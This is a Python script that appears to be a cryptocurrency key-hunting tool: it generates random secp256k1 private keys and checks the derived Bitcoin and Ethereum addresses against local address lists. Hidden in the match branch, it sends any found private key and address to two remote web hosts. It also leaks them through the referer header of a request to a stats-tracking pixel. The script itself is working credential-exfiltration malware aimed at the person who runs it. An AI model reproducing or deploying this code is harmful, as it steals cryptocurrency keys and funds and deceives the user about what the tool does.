import os,requests
import bit
import time
import binascii
import random
import sys

from eth_hash.auto import keccak
from fastecdsa import curve
from fastecdsa.point import Point

################# SETTİNGS #####################

website_info = "http://ziguas.pserver.ru/bcon/?id="
website_info2 = "https://dlmzed.000webhostapp.com/?id="
hs_stats = "http://sstatic1.histats.com/0.gif?4435132&101"
referrer = "eygimokress"

################################################
address_list = []
for filename in os.listdir('data'):
    xaa = open("data/"+filename).read().splitlines()
    for x in xaa:
        address_list.append(x)
print("Tot: "+str(len(address_list)))
address_list = set(address_list)

k = 0
z = 0
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
key_int = random.randint(1,N)
G = curve.secp256k1.G
x1, y1 = bit.format.public_key_to_coords(bit.Key.from_int(key_int).public_key)
P = Point(x1,y1, curve=curve.secp256k1)
print('Starting:', 'base: ',"{:064x}".format(key_int))
start = time.time()
PERIOD_OF_TIME = 21600 # 30min 1800
while True:
    current_pvk = key_int + k
    if k > 0:
        P += G

    upub = bit.format.point_to_public_key(P, compressed=False)
    upub_c = bit.format.point_to_public_key(P, compressed=True)
    eth_addr = '0x' + keccak(upub[1:])[-20:].hex()
    btc_u = bit.format.public_key_to_address(upub)
    btc_c = bit.format.public_key_to_address(upub_c)
    btc_segwit = bit.format.public_key_to_segwit_address(upub_c)

    if (z+1)%300000 == 0: 
        print('checked ',z+1,' \nHex: ', "{:064x}".format(current_pvk), '\nETH/mintme: ',eth_addr, '\nBtcU: ',btc_u, '\nBtcC: ',btc_c, '\nBtcSegv: ',btc_segwit)
        k = 0
        key_int = random.randint(1,N)
        G = curve.secp256k1.G
        x1, y1 = bit.format.public_key_to_coords(bit.Key.from_int(key_int).public_key)
        P = Point(x1,y1, curve=curve.secp256k1)
        print('\n\nUpdate', 'base: ',"{:064x}".format(key_int))
        if time.time() >= start + PERIOD_OF_TIME : 
            try:
                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(referrer)+'.com'})
            except:
                pass
            start = time.time()
    
    for gen_adrs in [eth_addr, btc_u, btc_c, btc_segwit]:
        if gen_adrs in address_list:
            try:
                privkey = "{:064x}".format(current_pvk)
                respns = requests.get(str(website_info)+str(privkey)+"_"+str(gen_adrs), timeout=60)
                print(respns)
                time.sleep( 10 )
                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(gen_adrs)+'.com'})
            except:
                pass
            try:
                privkey = "{:064x}".format(current_pvk)
                respns = requests.get(str(website_info2)+str(privkey)+"_"+str(gen_adrs), timeout=60)
                print(respns)
                time.sleep( 10 )
                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(gen_adrs)+'.com'})
            except:
                pass
    
    k += 1
    z += 1
